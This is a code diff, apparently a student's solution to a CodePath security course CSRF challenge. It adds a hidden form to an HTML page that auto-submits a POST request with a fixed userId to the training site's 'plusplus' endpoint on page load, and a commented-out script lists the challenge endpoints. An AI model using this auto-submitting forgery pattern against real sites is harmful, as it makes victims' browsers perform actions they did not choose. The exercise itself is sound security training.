@@ -8,5 +8,28 @@
   </head>
   <body>
     <h1>First challenge</h1>
+
+    <form
+      name="csrfForm"
+      action="https://security.codepath.com/user/csrfchallengetwo/plusplus"
+      method="POST"
+    >
+      <input
+        type="hidden"
+        name="userId"
+        value="44b0144df635d674aaaad7e63a2f49bd98247984"
+      />
+      <input type="submit" />
+    </form>
+    <script>
+      document.csrfForm.submit();
+    </script>
+
+    <!-- <script>
+      const base_url = "https://security.codepath.com";
+      const userId = "44b0144df635d674aaaad7e63a2f49bd98247984";
+      const csrf1_endpoint = `/user/csrfchallengeone/plusplus?userid=${userId}`;
+      const csrf2_endpoint = `/user/csrfchallengetwo/plusplus?userid=${userId}`;
+    </script> -->
   </body>
 </html>
